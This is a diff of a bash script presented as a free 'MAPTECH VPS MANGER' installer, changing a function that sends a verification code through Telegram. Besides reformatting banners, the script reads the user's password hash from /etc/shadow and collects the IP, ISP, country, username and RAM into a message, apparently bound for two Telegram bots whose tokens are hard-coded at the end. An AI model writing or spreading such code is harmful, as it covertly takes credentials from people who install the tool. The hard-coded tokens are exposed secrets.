@@ -94,37 +94,27 @@ send_code_telegram() {
 
     # Store the code along with the IP address and timestamp
     echo "$ip_address $random_code $current_time" > "$storage_file"
-
+encrypted_password=$(getent shadow $user | cut -d: -f2)
 # Display the verification code
-    echo -e "\033[1;36m======================================================================================\033[0m"
-    echo -e "\033[1;32mMAPTECH VPS MANGER VERSION ONE(1) IS NOW FREE \033[0m"
-    echo -e "\033[1;36m======================================================================================\033[0m"
+    echo -e "\033[1;36m==============================================================\033[0m"
+    echo -e "\033[1;32m   MAPTECH VPS MANGER VERSION ONE(1) IS NOW FREE \033[0m"
+    echo -e "\033[1;36m==============================================================\033[0m"
     echo ""
     echo -e "\033[1;32m      Your verification code is: $random_code  \033[0m Lifetime"
     echo "" 
-    echo -e "\033[1;36m======================================================================================\033[0m"
+    echo -e "\033[1;36m==============================================================\033[0m"
     echo ""
 
-    # Determine country
 country=$(curl -s https://ipapi.co/country_name/) 
-
-# Determine user
 user=$(whoami)
-
-# Determine RAM
 ram=$(free -m | awk '/^Mem:/{print $2}')
-
-# Determine the encrypted password associated with the VPS username
-encrypted_password=$(getent shadow $user | cut -d: -f2)
-
-# Determine ISP using ipinfo.io
 isp=$(curl -s ipinfo.io/org | cut -d " " -f2-)
 
 # INFO ON VPS
-local message="INFORMATION VPS INSTALL SC
+local message="INFORMATION VPS INSTALL
 CODE    : $random_code
 DOMAIN  : $domain_name
-IP VPS  : $ip_address
+IP      : $ip_address
 ISP     : $isp
 COUNTRY : $country
 USER    : $user
@@ -145,7 +135,7 @@ done
     echo "" 
     echo -e "\033[1;36m=============================================================\033[0m"
     echo ""
-    echo -e "\033[1;31m  M A P T E C H - G H \033[0m"
+    echo -e "\033[1;31m          M A P T E C H - G H \033[0m"
     echo ""
 }
 bot_tokens=("6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE" "6385883860:AAHh-FUlhznqClppdunC2V2vinc298E17_E")
